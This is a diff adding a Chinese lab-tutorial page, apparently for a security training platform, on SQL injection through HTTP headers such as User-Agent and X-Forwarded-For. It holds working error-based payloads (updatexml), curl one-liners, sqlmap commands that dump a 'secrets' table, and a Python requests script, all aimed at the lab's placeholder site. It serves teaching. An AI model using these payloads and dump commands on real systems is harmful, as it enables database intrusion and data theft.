@@ -1,0 +1,84 @@
+<h4>先分清：本关的注入点在 HTTP 请求头里</h4>
+<p>注入点是 <code>User-Agent</code> 请求头，页面加载时服务端把它直接拼进 <code>WHERE username = '$ua'</code>，页面会回显当前 UA 与执行过的 SQL，方便对照。</p>
+<ul>
+<li><b>参数位置不同：</b>GET/POST 注入在 URL 或 Body 里，本关在 HTTP 请求头里，浏览器地址栏和表单都改不到，必须用代理或命令行工具修改请求头。</li>
+<li><b>可控的请求头：</b><code>User-Agent</code>、<code>Referer</code>、<code>Cookie</code>、<code>X-Forwarded-For</code>、<code>X-Real-IP</code> 等都是客户端可控的，都可能成为注入点。</li>
+<li><b>工具入口不同：</b>GET 用 <code>sqlmap -u "url?id=1"</code>；请求头注入要用 <code>sqlmap -r request.txt -p User-Agent</code>，或在 curl 里用 <code>-H</code> 指定头。</li>
+</ul>
+
+<h4>Burp Suite（抓包改请求头，最直观）</h4>
+<p><b>解决什么问题：</b>浏览器默认 UA 很长且含特殊字符，Burp 可以拦下请求在 Raw 里直接改 <code>User-Agent</code> 值，反复 Repeater 调试。</p>
+<pre>
+1. 浏览器代理设为 127.0.0.1:8080，打开 {{SITE}}/modules/sqli/header.php
+2. Proxy → HTTP history 找到 GET /bafanglab/modules/sqli/header.php
+3. 右键 → Send to Repeater，在 Raw 里把 User-Agent 改成注入 payload，点 Send
+4. 对照响应：MySQL 错误 / 查询结果表格 / 页面回显的「执行 SQL」
+</pre>
+<ul>
+<li><b>Repeater</b>：手动改 <code>User-Agent</code> 逐条试闭合方式（<code>'</code>、<code>"</code>）与注释符（<code>#</code>、<code>-- </code>、<code>/**/</code>）。</li>
+<li><b>Intruder</b>：把 <code>User-Agent</code> 的值设成 payload 位置，加载字典批量跑，按响应长度/关键字差异找注入。</li>
+<li><b>保存请求文件：</b>Repeater 里右键 → Save item，存成 <code>req_header.txt</code>，供 sqlmap 的 <code>-r</code> 使用。</li>
+</ul>
+
+<h4>curl（命令行快速验证）</h4>
+<p><b>解决什么问题：</b>不开代理、不打开浏览器，一条命令直接修改请求头发起注入。</p>
+<pre>
+# 1. 确认报错回显
+curl -H "User-Agent: admin'" {{SITE}}/modules/sqli/header.php
+
+# 2. 报错注入读版本
+curl -H "User-Agent: ' or updatexml(1,concat(0x7e,version()),1)-- -" {{SITE}}/modules/sqli/header.php
+
+# 3. 读通关凭证
+curl -H "User-Agent: ' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -" {{SITE}}/modules/sqli/header.php
+
+# 4. 同时测试 X-Forwarded-For（若系统从该头取 IP 入库）
+curl -H "X-Forwarded-For: ' or updatexml(1,concat(0x7e,database()),1)-- -" {{SITE}}/modules/sqli/header.php
+</pre>
+<p><b>提示：</b>curl 的 <code>-H</code> 可以多次使用，同时设置多个请求头；UA 里含空格和特殊字符时用双引号包裹整个头值。</p>
+
+<h4>sqlmap（自动化拖库）</h4>
+<p><b>解决什么问题：</b>自动识别请求头注入点、判断注入类型、枚举库表并导出数据。</p>
+<pre>
+# 1. 先把 Burp 抓到的请求保存为 req.txt（包含完整的请求行、头、空行）
+# 2. 指定 User-Agent 为注入点
+sqlmap -r req.txt -p User-Agent --dbs --batch
+
+# 3. 导出 secrets 表（通关凭证）
+sqlmap -r req.txt -p User-Agent -D bafanglab -T secrets --dump --batch
+
+# 4. 只跑报错注入，减少无效探测
+sqlmap -r req.txt -p User-Agent --technique=E --batch
+
+# 5. 测试多个请求头（用 * 标记注入点，写在 req.txt 里）
+# 在 req.txt 的 User-Agent 值后加 *，如：User-Agent: Mozilla*
+sqlmap -r req.txt --batch
+</pre>
+<p><b>注意：</b>sqlmap 的 <code>-p</code> 指定请求头时，头名要和请求里完全一致（大小写不敏感）；若用 <code>*</code> 标记，需把标记放在请求文件里对应的值后面。</p>
+
+<h4>浏览器插件（快速改 UA）</h4>
+<ul>
+<li><b>User-Agent Switcher</b>：Chrome/Firefox 插件，可自定义 UA 字符串，适合快速测试单个 payload。</li>
+<li><b>ModHeader</b>：可自定义任意请求头（包括 <code>X-Forwarded-For</code>、<code>Referer</code>），适合测试多个头的注入。</li>
+<li>插件方式适合快速验证，但批量跑字典还是建议用 Burp Intruder 或 sqlmap。</li>
+</ul>
+
+<h4>Python requests（批量脚本）</h4>
+<p><b>解决什么问题：</b>把 payload 参数化，批量跑字典、比较响应，适合写报错/盲注的自动化验证。</p>
+<pre>
+import requests
+
+url = "{{SITE}}/modules/sqli/header.php"
+
+# 报错注入读通关凭证
+headers = {
+    "User-Agent": "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"
+}
+r = requests.get(url, headers=headers, timeout=10)
+print(r.status_code, r.text[:300])
+</pre>
+<ul>
+<li><b>与 GET/POST 的差别：</b>GET/POST 用 <code>params</code> / <code>data</code> 传参；请求头注入用 <code>headers</code> 参数传，payload 放在头值里。</li>
+<li>可同时设置多个头测试：<code>headers = {"User-Agent": payload, "X-Forwarded-For": payload}</code>。</li>
+<li>盲注判断：固定其他头，只替换 <code>User-Agent</code>，比较 <code>len(r.text)</code> 或耗时差异。</li>
+</ul>
